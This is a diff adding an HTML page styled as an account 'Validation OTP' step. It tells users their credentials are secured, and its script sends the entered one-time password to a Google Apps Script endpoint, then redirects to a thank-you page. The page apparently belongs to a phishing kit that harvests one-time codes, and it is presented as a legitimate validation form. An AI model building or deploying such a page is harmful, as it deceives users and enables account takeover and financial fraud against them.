@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validation OTP</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #013a7a; /* same deep blue as index.html */
+      margin: 0;
+      padding: 0;
+      color: #333;
+      text-align: center;
+    }
+
+    .header {
+      background-color: #013a7a;
+      padding: 40px 20px 20px;
+      color: #ffd200; /* yellow text */
+      text-transform: uppercase;
+      font-weight: 700;
+      font-size: 22px;
+    }
+
+    .subtext {
+      color: #fff;
+      font-size: 14px;
+      margin-top: 8px;
+      font-weight: 400;
+      text-transform: none;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 16px;
+      max-width: 360px;
+      margin: 40px auto;
+      padding: 30px 25px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 8px;
+      color: #333;
+      font-weight: 600;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #ffd200;
+      border: none;
+      color: #013a7a;
+      font-weight: 700;
+      border-radius: 30px;
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #f2c400;
+    }
+
+    .notice {
+      font-size: 13px;
+      color: #777;
+      text-align: center;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    Validation OTP
+    <div class="subtext">Enter the OTP to complete your account validation</div>
+  </div>
+
+  <div class="container">
+    <form id="otpForm">
+      <label for="otp">Validation OTP</label>
+      <input type="text" id="otp" name="validation_otp" placeholder="Enter OTP" required>
+      <button type="submit">Validate OTP →</button>
+      <div class="notice" id="status">Your credentials are secured.</div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('otpForm');
+    const statusEl = document.getElementById('status');
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusEl.textContent = "Submitting...";
+      statusEl.style.color = "#555";
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
+        const text = await response.text();
+
+        let json;
+        try { json = JSON.parse(text); } catch {
+          statusEl.textContent = "Invalid response from server.";
+          statusEl.style.color = "#b00000";
+          return;
+        }
+
+        if (json.result === "success") {
+          window.location.href = "thankyou.html";
+        } else {
+          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
+          statusEl.style.color = "#b00000";
+        }
+      } catch (err) {
+        statusEl.textContent = "Network error. Try again.";
+        statusEl.style.color = "#b00000";
+      }
+    });
+  </script>
+</body>
+</html>
